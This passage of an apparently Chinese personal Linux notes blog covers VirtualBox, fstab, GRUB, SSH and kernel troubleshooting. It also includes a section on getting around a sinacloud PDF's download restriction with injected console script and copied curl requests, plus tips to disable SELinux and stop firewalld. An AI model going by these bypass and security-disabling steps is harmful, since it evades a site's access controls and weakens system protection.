class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install --fix-missing</span><br><span class=\"line\">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms </span><br><span class=\"line\">sudo modprobe vboxdrv</span><br></pre></td></tr></table></figure>\n<p> 解决问题</p>\n</li>\n<li>题外话：删除内核时，<code>dpkg --get-selections | grep linux</code> 没有看到4.17相关的</li>\n</ul>\n<h3 id=\"删除内核\"><a href=\"#删除内核\" class=\"headerlink\" title=\"删除内核\"></a>删除内核</h3><ul>\n<li><code>sudo apt-get remove linux-headers-4.4.0-22</code></li>\n<li>在<code>/boot/</code>目录下删除相关的东西</li>\n</ul>\n<h3 id=\"chmod\"><a href=\"#chmod\" class=\"headerlink\" title=\"chmod\"></a>chmod</h3><ul>\n<li><code>chmod -R 666 test</code>(test is a directory)会导致文件夹里的东西不可读（ls、cd该文件夹都不行）</li>\n<li>给文件夹本身加上x——<code>chmod 777 test</code>就可以了——文件夹内的东西不需要有可执行权限，但是文件夹的权限要有<code>x</code>标志</li>\n</ul>\n<h3 id=\"内核模块加载\"><a href=\"#内核模块加载\" class=\"headerlink\" title=\"内核模块加载\"></a>内核模块加载</h3><ul>\n<li><code>modprobe tcp_bbr</code>加载<code>tcp_bbr</code>模块 </li>\n<li>比如，<code>echo &quot;tcp_bbr&quot;&gt;&gt; /etc/modules-load.d/modules.conf</code>即可实现启动自动加载该模块</li>\n</ul>\n<h3 id=\"ufw\"><a href=\"#ufw\" class=\"headerlink\" title=\"ufw\"></a>ufw</h3><ul>\n<li>如果有一条规则允许任意from ip 连本机的某个端口，协议是udp，然后还有另一条规则是只允许某ip K连本机的任意端口，协议是tcp，那么用ip 为K的机子去连是连不上udp的，似乎是因为规则的强弱导致的覆盖</li>\n</ul>\n<h3 id=\"安装centos-md\"><a href=\"#安装centos-md\" class=\"headerlink\" title=\"安装centos.md\"></a>安装centos.md</h3><h4 id=\"联网\"><a href=\"#联网\" class=\"headerlink\" title=\"联网\"></a>联网</h4><ul>\n<li><p><a href=\"http://icyleaf.com/2013/09/network-configuration-in-centos/\" target=\"_blank\" rel=\"noopener\">参考资料</a></p>\n</li>\n<li><p>修改<code>/etc/sysconfig/network-scripts/ifcfg-eth0 (此处为网卡名对应的文件，比入enps0是ifcfg-enps0)</code></p>\n</li>\n<li><p>改为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DEVICE=eth0</span><br><span class=\"line\">HWADDR=&quot;00:22:19:09:4D:3C&quot;</span><br><span class=\"line\">NM_CONTROLLED=yes</span><br><span class=\"line\">ONBOOT=yes      # 默认是 no，我们要改成 yes</span><br><span class=\"line\">BOOTPROTO=dhcp  # 如果不是这个值也要修改</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重启network service</p>\n<ul>\n<li>方法一：<code>service network restart</code></li>\n<li>方法二：<code>/etc/init.d/network restart</code></li>\n</ul>\n</li>\n<li><p>vbox似乎默认有开nat，所以以上即可，qemu好像要自己配置nat</p>\n</li>\n</ul>\n<h4 id=\"安装图形界面\"><a href=\"#安装图形界面\" class=\"headerlink\" title=\"安装图形界面\"></a>安装图形界面</h4><ul>\n<li><a href=\"https://www.quora.com/How-can-I-install-X-Windows-on-CentOS-7\" target=\"_blank\" rel=\"noopener\">安装图形界面</a><ul>\n<li><code>yum groupinstall &quot;X Window System&quot;</code></li>\n<li><code>yum install gnome-classic-session gnome-terminal nautilus-open-terminal control-center liberation-mono-fonts</code></li>\n<li><code>unlink /etc/systemd/system/default.target</code></li>\n<li><code>ln -sf /lib/systemd/system/graphical.target  /etc/systemd/system/default.target</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"使用fstab自动挂载\"><a href=\"#使用fstab自动挂载\" class=\"headerlink\" title=\"使用fstab自动挂载\"></a>使用fstab自动挂载</h3><h4 id=\"Deepin\"><a href=\"#Deepin\" class=\"headerlink\" title=\"Deepin\"></a>Deepin</h4><ul>\n<li><p>以下是<code>/etc/fstab</code>的内容</p>\n</li>\n<li><p>在<code>Linux hzx-PC 4.9.0-deepin13-amd64 #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) x86_64 GNU/Linux</code>正确工作</p>\n</li>\n<li><p>代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># /dev/sda7</span><br><span class=\"line\">UUID=1faa19b8-abfb-44db-b186-5a368498d42b\t/         \text4      \trw,relatime,data=ordered\t0 1</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda1</span><br><span class=\"line\">UUID=CCCB-BF68      \t/boot/efi \tvfat      \trw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro\t0 2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda4</span><br><span class=\"line\">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3\tnone      \tswap      \tdefaults  \t0 0</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda5</span><br><span class=\"line\"># UUID=0CADCC32742391F2       /home/hzx/sda5  \t    ntfs defaults\t0 1</span><br><span class=\"line\">UUID=0CADCC32742391F2   /mnt/data  ntfs defaults  1   2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class=\"line\"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda6</span><br><span class=\"line\"># UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults\t0 1</span><br><span class=\"line\">UUID=2A3C344750F6F698   /mnt/software  ntfs defaults 1   2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda3</span><br><span class=\"line\"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults\t0 1</span><br><span class=\"line\">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa\t/mnt/deepin-sda3 ext4  defaults  1   2</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然而并没有一直正常，后来修改了一次挂载点后，就一直崩，无论是把<code>defaults</code>换成<code>nofail</code>还是相反，都没用</p>\n</li>\n<li><p>后来多启动几次就好了，，可能是类似多进程执行顺序之类的东西导致的不确定性错误</p>\n</li>\n</ul>\n<h4 id=\"Ubuntu\"><a href=\"#Ubuntu\" class=\"headerlink\" title=\"Ubuntu\"></a>Ubuntu</h4><ul>\n<li><p>一切正常</p>\n</li>\n<li><p>代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># /etc/fstab: static file system information.</span><br><span class=\"line\">#</span><br><span class=\"line\"># Use &apos;blkid&apos; to print the universally unique identifier for a</span><br><span class=\"line\"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class=\"line\"># that works even if disks are added and removed. See fstab(5).</span><br><span class=\"line\">#</span><br><span class=\"line\"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class=\"line\"># / was on /dev/sda8 during installation</span><br><span class=\"line\">UUID=3ae3faef-8fe6-42ef-8874-a0417df43831 /               ext4    errors=remount-ro 0       1</span><br><span class=\"line\"># /boot/efi was on /dev/sda1 during installation</span><br><span class=\"line\">UUID=CCCB-BF68  /boot/efi       vfat    umask=0077      0       1</span><br><span class=\"line\"># swap was on /dev/sda4 during installation</span><br><span class=\"line\">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none            swap    sw              0       0</span><br><span class=\"line\"># /dev/sda5</span><br><span class=\"line\"># UUID=0CADCC32742391F2       /home/hzx/sda5  \t    ntfs defaults\t0 1</span><br><span class=\"line\">UUID=0CADCC32742391F2   /media/hzx/0CADCC32742391F2  ntfs nofail  1   2</span><br><span class=\"line\"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class=\"line\"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda6</span><br><span class=\"line\"># UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults\t0 1</span><br><span class=\"line\">UUID=2A3C344750F6F698   /media/hzx/2A3C344750F6F698  ntfs nofail  1   2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda9</span><br><span class=\"line\">UUID=202D1B334927E0CC /media/hzx/202D1B334927E0CC ntfs nofail 1 2</span><br><span class=\"line\"></span><br><span class=\"line\"># /dev/sda3</span><br><span class=\"line\"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults\t0 1</span><br><span class=\"line\">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa\t/media/hzx/9bb0bb13-a28a-48a4-8022-6e83dcec47aa ext4 nofail     1   2</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"mkfs-vfat了sda2那个efi分区结果deepin启动不了\"><a href=\"#mkfs-vfat了sda2那个efi分区结果deepin启动不了\" class=\"headerlink\" title=\"mkfs.vfat了sda2那个efi分区结果deepin启动不了\"></a>mkfs.vfat了sda2那个efi分区结果deepin启动不了</h3><ul>\n<li>情况是这样的：往sda2装grub后总是失败，然后deepin自己的boot分区虽然也有grub，也有grub.cfg但是也一直必须手动引导。然后把sda2格式化后不知道为什么deepin无法启动。</li>\n<li>放弃，新装一个deepin 15.6，然后就会自动安装引导。</li>\n<li>搞定后，进原来那个deepin15.5还是失败，查看<code>journalctl -xb</code>，发现有个设备无法加载还是怎样的，然后想到以前该fstab也这样，所以比对错误信息和fstab，果然如此。</li>\n<li>原因是swap分区的uuid改了，并且也从sda4变成sda5，然而并没有去新建分区什么的，只有格式化sda2。</li>\n<li>后来猜测之所以装不上grub可能是sda2太小，只有100M，deepin提示说至少要300M</li>\n</ul>\n<h3 id=\"编译内核-md\"><a href=\"#编译内核-md\" class=\"headerlink\" title=\"编译内核.md\"></a>编译内核.md</h3><h4 id=\"无openssl-bio-h\"><a href=\"#无openssl-bio-h\" class=\"headerlink\" title=\"无openssl/bio.h\"></a>无openssl/bio.h</h4><blockquote>\n<p>编译Linux-4.9.11内核时遇到：“error : openssl/bio.h :No such file or folder”</p>\n<p> “ #include &lt;openssl/bio.h&gt;”</p>\n<p>&lt;&lt;<------------------------------------>&gt;&gt;</------------------------------------></p>\n<p>解决方法: [ubuntu 16.10,64位主机]</p>\n<p><code>sudo apt install libssl-dev</code></p>\n</blockquote>\n<h3 id=\"记一次尝试下载-不允许下载的sinacloud的pdf\"><a href=\"#记一次尝试下载-不允许下载的sinacloud的pdf\" class=\"headerlink\" title=\"记一次尝试下载 不允许下载的sinacloud的pdf\"></a>记一次尝试下载 不允许下载的sinacloud的pdf</h3><ul>\n<li><p>获得页面源代码</p>\n</li>\n<li><p>在html搜索字符串next从而定位到逻辑代码</p>\n</li>\n<li><p>然后看到后面一堆JavaScript:void(0)，发现前面有个函数，但是页面内一堆引用外部的js脚本</p>\n</li>\n<li><p>然后去chrome控制台使用以下代码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">    script.type = <span class=\"string\">'text/javascript'</span>;</span><br><span class=\"line\">    script.innerHTML = <span class=\"string\">\"console.log(closePay)\"</span><span class=\"comment\">//括号内是要获得的函数名称;</span></span><br><span class=\"line\">    <span class=\"built_in\">document</span>.head.appendChild(script);</span><br><span class=\"line\">&#125;, <span class=\"number\">1000</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然后等chrome显示出来后，点击显示出来的东西可以跳转到source code那里。从而最终定位到该函数所在的脚本，但是苦于代码过度，审计失败</p>\n</li>\n<li><p>直接wget那些url得到的是206，但是wget一直停不下来，尝试用axel开20个线程下载，但是每次下来的都是13.9m大小的东西，然后还打不开（除了其中一页图片）</p>\n</li>\n<li><p>查看chrome控制台的network模块，发现图片都没那么大，所以尝试右键copy request head发现并没有特别的，所以不知道为什么wget和axel没成功，copy curl后发现似乎是一个curl命令，加上-o参数后成功下载，curl即使不加上请求头，也可以正常获得东西，nice</p>\n</li>\n</ul>\n<h4 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h4><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//request head</span><br><span class=\"line\">http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span><br><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: sinacloud.net</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">DNT</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: en,zh;q=0.9,zh-CN;q=0.8</span><br><span class=\"line\"></span><br><span class=\"line\">//从chrome复制的curl命令</span><br><span class=\"line\">curl 'http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=3259947-3560373' -H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8' -H 'Connection: keep-alive' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en,zh;q=0.9,zh-CN;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36' --compressed</span><br></pre></td></tr></table></figure>\n<h3 id=\"查找并删除特定文件-md\"><a href=\"#查找并删除特定文件-md\" class=\"headerlink\" title=\"查找并删除特定文件.md\"></a>查找并删除特定文件.md</h3><p><a href=\"https://www.cnblogs.com/langzou/p/5959940.html\" target=\"_blank\" rel=\"noopener\">来源</a><br>linux命令每日一练<br>linux中find与rm实现查找并删除目录或文件</p>\n<p>linux 下用find命令查找文件，rm命令删除文件。</p>\n<p>删除指定目录下指定文件<br>find 要查找的目录名 -name .svn |xargs rm -rf</p>\n<p>删除指定名称的文件或文件夹: find -type d | grep .svn$ | xargs rm -r</p>\n<p>分析：<br>find -type d | grep .svn$ 通过此命令查找文件夹 过滤正则表达式中的目录<br>| xargs rm -r 执行删除指令</p>\n<p>删除目录下所有exe文件</p>\n<p>find . -name ‘*.exe’ -type f -print -exec rm -rf {} ;</p>\n<p>(1) “.” 表示从当前目录开始递归查找</p>\n<p>(2) “ -name ‘*.exe’ “根据名称来查找，要查找所有以.exe结尾的文件夹或者文件</p>\n<p>(3) “ -type f “查找的类型为文件</p>\n<p>(4) “-print” 输出查找的文件目录名</p>\n<p>(5) 最主要的是是-exec了，-exec选项后边跟着一个所要执行的命令，表示将find出来的文件或目录执行该命令。<br>exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个，最后是一个分号</p>\n<h3 id=\"VPS上部署hexo\"><a href=\"#VPS上部署hexo\" class=\"headerlink\" title=\"VPS上部署hexo\"></a>VPS上部署hexo</h3><ul>\n<li><p><a href=\"https://blog.fundebug.com/2017/05/18/deploy-hexo-on-cloud/\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n</li>\n<li><p>遇到nginx 403，然后就关闭selinux</p>\n<blockquote>\n<p>1、临时关闭<br>setenforce 0 #设置SELinux 成为permissive模式</p>\n<h5 id=\"setenforce-1-设置SELinux-成为enforcing模式\"><a href=\"#setenforce-1-设置SELinux-成为enforcing模式\" class=\"headerlink\" title=\"setenforce 1 设置SELinux 成为enforcing模式\"></a>setenforce 1 设置SELinux 成为enforcing模式</h5><p>2、修改配置文件需要重启机器：</p>\n<p>修改/etc/selinux/config 文件</p>\n<p>将SELINUX=enforcing改为SELINUX=disabled</p>\n<p>重启机器即可</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"搭建ss服务器\"><a href=\"#搭建ss服务器\" class=\"headerlink\" title=\"搭建ss服务器\"></a>搭建ss服务器</h3><ul>\n<li>vps开了进程</li>\n<li>本地主机也如此</li>\n<li>但是提示[Errno 113] No route to host</li>\n<li>实在搞不明白——22端口可以用scp发文件过去vps</li>\n<li>所以用py写了个tcpclient、tcpserver，然后一运行也如此提示</li>\n<li>所以在vps运行<code>service firewalld stop</code></li>\n<li>其他关闭服务器防火墙的方法都不起作用，不知道问什么</li>\n</ul>\n<h3 id=\"VLC字幕\"><a href=\"#VLC字幕\" class=\"headerlink\" title=\"VLC字幕\"></a>VLC字幕</h3><p><a href=\"http://blog.sina.com.cn/s/blog_47ecc3660100vtnc.html\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h3 id=\"vbox的win7虚拟机无法使用usb\"><a href=\"#vbox的win7虚拟机无法使用usb\" class=\"headerlink\" title=\"vbox的win7虚拟机无法使用usb\"></a>vbox的win7虚拟机无法使用usb</h3><ul>\n<li><a href=\"https://blog.csdn.net/harry_helei/article/details/46972125\" target=\"_blank\" rel=\"noopener\">引用自</a></li>\n<li>安装Virtualbox Extension Pack</li>\n<li>用户权限添加<ul>\n<li>添加usbfs 用户组（virtualbox 装完成后会有 vboxusers 和vboxsf ）<code>sudo groupadd usbfs</code>   </li>\n<li>将你的linux常用用户添加到vboxusers、usbfs这个两个组中<code>sudo adduser kuein vboxusers</code>  <code>sudo adduser kuein usbfs</code> </li>\n<li>重启电脑，启动Virtualbox，确认在virtualbox管理器中，USB设备的enable usb controler 、enable usb2.0 controler打勾。Win7启动后，右击右下角USB设备符号，在Setting中，选择USB Massage相关的选项，就会自动安装驱动，驱动安装成功后，win7下成功挂载U盘。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Gnome-configure-md\"><a href=\"#Gnome-configure-md\" class=\"headerlink\" title=\"Gnome-configure.md\"></a>Gnome-configure.md</h3><h3 id=\"hide-title-bar\"><a href=\"#hide-title-bar\" class=\"headerlink\" title=\"hide title bar\"></a>hide title bar</h3><p><a href=\"https://extensions.gnome.org/extension/1267/no-title-bar/\" target=\"_blank\" rel=\"noopener\">no-title-bar-extention</a></p>\n<h3 id=\"SSH-md\"><a href=\"#SSH-md\" class=\"headerlink\" title=\"SSH.md\"></a>SSH.md</h3><h4 id=\"生成秘钥\"><a href=\"#生成秘钥\" class=\"headerlink\" title=\"生成秘钥\"></a>生成秘钥</h4><ul>\n<li>本地用<code>ssh-keygen</code>生成一个秘钥——可以自定义储存的文件名</li>\n<li>把<code>id_rsa.pub</code>传送到vps上，<code>cat id_rsa.pug &gt; ~/.ssh/authorized_keys</code>，注意，这个命令会覆盖原有的<code>authorized_keys</code>内容</li>\n</ul>\n<h4 id=\"本地配置VPS别名\"><a href=\"#本地配置VPS别名\" class=\"headerlink\" title=\"本地配置VPS别名\"></a>本地配置VPS别名</h4><ul>\n<li><p>代码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt;&gt; ~/.ssh/config &lt;&lt;EOF</span><br><span class=\"line\">Host VultrVPS</span><br><span class=\"line\">    User root</span><br><span class=\"line\">    Hostname 217.163.11.0</span><br><span class=\"line\">    PreferredAuthentications publickey</span><br><span class=\"line\">    IdentityFile ~/.ssh/VultrVPS_rsa</span><br><span class=\"line\">    Port 22</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>以上可实现使用秘钥 ，多个VPS可以依次增加配置</p>\n</li>\n</ul>\n<h3 id=\"Linux安装-md\"><a href=\"#Linux安装-md\" class=\"headerlink\" title=\"Linux安装.md\"></a>Linux安装.md</h3><h4 id=\"硬盘安装deepin\"><a href=\"#硬盘安装deepin\" class=\"headerlink\" title=\"硬盘安装deepin\"></a>硬盘安装deepin</h4><ul>\n<li><a href=\"http://bbs.iaixue.com/forum.php?mod=viewthread&amp;tid=1812\" target=\"_blank\" rel=\"noopener\">来源</a></li>\n</ul>\n<blockquote>\n<p>将如下grub菜单放到/boot/grub/grub.cfg的menuentry菜单处/deepin-15.5-amd64.iso是deepin的镜像文件完整路径，可以自由地放在linux或windows分区中，区分大小写</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">menuentry &quot;UEFI Deepin 15.4 Linux ISO live&quot; --class deepin --class gnu-linux --class gnu --class os&#123;</span><br><span class=\"line\">        echo &apos;booting...&apos;</span><br><span class=\"line\">        set isofile=/deepin-15.5-amd64.iso</span><br><span class=\"line\">        search --file $isofile --set=root</span><br><span class=\"line\">        loopback loop $isofile</span><br><span class=\"line\">        linux (loop)/live/vmlinuz.efi findiso=$isofile noprompt quiet boot=live ro deepin-installer locales=zh_CN.UTF-8 keyboard-configuration/layoutcode=us keyboard-configuration/variantcode= --  rootflags=sync</span><br><span class=\"line\">        initrd (loop)/live/initrd.lz</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"刻录U盘安装Fedora或Centos\"><a href=\"#刻录U盘安装Fedora或Centos\" class=\"headerlink\" title=\"刻录U盘安装Fedora或Centos\"></a>刻录U盘安装Fedora或Centos</h4><ul>\n<li>win下使用PowerISO刻录</li>\n<li>使用简单的dd命令<code>dd if=xxx of=xxx bs=xx</code>失败</li>\n<li>使用Ultraiso失败</li>\n</ul>\n<h4 id=\"U盘grub引导多个linux镜像安装\"><a href=\"#U盘grub引导多个linux镜像安装\" class=\"headerlink\" title=\"U盘grub引导多个linux镜像安装\"></a>U盘grub引导多个linux镜像安装</h4><ul>\n<li><a href=\"https://my.oschina.net/abcfy2/blog/491140\" target=\"_blank\" rel=\"noopener\">U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式</a>。文中提供的deepin的那个grub配置无效</li>\n<li><a href=\"https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=150783\" target=\"_blank\" rel=\"noopener\">使用grub2制作启动U盘</a>，尝试把grub配置换为该链接的配置，可以启动到deepin进行安装，但是中途说挂载某分区失败从而安装失败<br><img src=\"./LinuxInstall_1.jpg\" alt=\"错误信息\"></li>\n</ul>\n<h3 id=\"OSC提供的代码make不过\"><a href=\"#OSC提供的代码make不过\" class=\"headerlink\" title=\"OSC提供的代码make不过\"></a>OSC提供的代码make不过</h3><figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source code 9th/final-src-osc9e/ch2 </span><br><span class=\"line\">➜ make                                                             </span><br><span class=\"line\">make -C /lib/modules/4.9.0-deepin13-amd64/build M=/home/hzx/Program/source code 9th/final-src-osc9e/ch2 modules</span><br><span class=\"line\"><span class=\"section\">make[1]: Entering directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class=\"line\"><span class=\"section\">arch/x86/Makefile:140: CONFIG_X86_X32 enabled but no binutils support</span></span><br><span class=\"line\"><span class=\"section\">make[3]: *** No rule to make target 'code'.  Stop.</span></span><br><span class=\"line\"><span class=\"section\">Makefile:150: recipe for target 'sub-make' failed</span></span><br><span class=\"line\"><span class=\"section\">make[2]: *** [sub-make] Error 2</span></span><br><span class=\"line\"><span class=\"section\">Makefile:8: recipe for target 'all' failed</span></span><br><span class=\"line\"><span class=\"section\">make[1]: *** [all] Error 2</span></span><br><span class=\"line\"><span class=\"section\">make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class=\"line\"><span class=\"section\">Makefile:3: recipe for target 'all' failed</span></span><br><span class=\"line\"><span class=\"section\">make: *** [all] Error 2</span></span><br></pre></td></tr></table></figure>\n<p>解决方法，把source code 9th这个文件名的空格去掉</p>\n<h3 id=\"vim-dos-unix\"><a href=\"#vim-dos-unix\" class=\"headerlink\" title=\"vim dos unix\"></a>vim dos unix</h3><ul>\n<li>如果某文本文件的行末都有0d0a，则vim直接打开识别为dos。如果是vim -b 打开，识别为unix。如果最后一行不是0d0a，其他行是，不识别为dos。</li>\n</ul>\n<h3 id=\"删除文件名以-开头的文件\"><a href=\"#删除文件名以-开头的文件\" class=\"headerlink\" title=\"删除文件名以-开头的文件\"></a>删除文件名以<code>-</code>开头的文件</h3><ul>\n<li>比如删除<code>-a</code>：<code>rm -- -a</code></li>\n</ul>\n<h3 id=\"文件的change，modification时间\"><a href=\"#文件的change，modification时间\" class=\"headerlink\" title=\"文件的change，modification时间\"></a>文件的change，modification时间</h3><ul>\n<li>以下来自于实验：change是修改属性，比如<code>touch -d 1111 filename</code>，modification是修改内容</li>\n</ul>\n<h3 id=\"ctags-注意事项\"><a href=\"#ctags-注意事项\" class=\"headerlink\" title=\"ctags 注意事项\"></a>ctags 注意事项</h3><ul>\n<li>如果某文件打开后编辑过，可能ctags打的tag就失效了（比如行号不对），所以跳转无效</li>\n</ul>\n<h3 id=\"watch命令\"><a href=\"#watch命令\" class=\"headerlink\" title=\"watch命令\"></a>watch命令</h3><ul>\n<li><code>watch -n 0.1 ./a.o</code> 与<code>watch ./a.o -n 0.1</code>的区别是前者<code>-n 0.1</code>是watch的参数，后者是<code>./a.o</code>的参数</li>\n</ul>\n<h3 id=\"修复light-display-manger失败\"><a href=\"#修复light-display-manger失败\" class=\"headerlink\" title=\"修复light display manger失败\"></a>修复light display manger失败</h3><ul>\n<li>通过启动时的错误信息，还有single模式中，service lightdm start后的错误信息（systemctl service ）可以知道light display manager启动失败</li>\n<li>搜到的都说重新安装dde，但是需要网络，而single-user mode 